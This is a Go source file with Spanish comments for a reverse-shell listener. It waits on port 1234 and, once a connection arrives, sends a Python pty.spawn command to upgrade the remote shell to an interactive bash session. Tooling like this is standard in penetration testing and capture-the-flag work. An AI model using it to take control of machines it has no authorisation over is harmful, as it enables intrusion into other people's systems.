// gocatty.go
package main

import (
	"fmt"
	"io"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	"golang.org/x/term"
)

func main() {
	addr := "0.0.0.0:1234"

	// Poner tu TTY en raw mode (equivalente a: stty raw -echo)
	fd := int(os.Stdin.Fd())
	oldState, err := term.MakeRaw(fd)
	if err != nil {
		fmt.Fprintln(os.Stderr, "MakeRaw error:", err)
		return
	}
	defer term.Restore(fd, oldState)

	// Restaurar TTY también si te sales con Ctrl+C / kill
	sigc := make(chan os.Signal, 1)
	signal.Notify(sigc, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigc
		term.Restore(fd, oldState)
		fmt.Println()
		os.Exit(0)
	}()

	ln, err := net.Listen("tcp", addr)
	if err != nil {
		fmt.Fprintln(os.Stderr, "listen error:", err)
		return
	}
	defer ln.Close()

	fmt.Println("Listening on", addr)

	conn, err := ln.Accept()
	if err != nil {
		fmt.Fprintln(os.Stderr, "accept error:", err)
		return
	}
	defer conn.Close()

	ra := conn.RemoteAddr().String()
	fmt.Println("Connection received on", ra)
	bootstrapRemoteShell(conn)

	// Pipe bidireccional
	done := make(chan struct{}, 2)

	go func() {
		_, _ = io.Copy(conn, os.Stdin)
		done <- struct{}{}
	}()
	go func() {
		_, _ = io.Copy(os.Stdout, conn)
		done <- struct{}{}
	}()

	<-done
}

// bootstrapRemoteShell intenta crear un PTY remoto y configurar TERM automáticamente.
func bootstrapRemoteShell(conn net.Conn) {
	commands := []string{
		`python3 -c 'import pty; pty.spawn("/bin/bash")' || python -c 'import pty; pty.spawn("/bin/bash")'`,
		"export TERM=xterm-256color",
	}

	fmt.Println("Enviando comandos para inicializar PTY remoto...")
	for _, cmd := range commands {
		if _, err := fmt.Fprintf(conn, "%s\n", cmd); err != nil {
			fmt.Fprintln(os.Stderr, "no se pudieron enviar comandos de inicializacion:", err)
			return
		}
		// Pequeña espera para dar tiempo a que la shell remota procese el comando.
		time.Sleep(250 * time.Millisecond)
	}
}
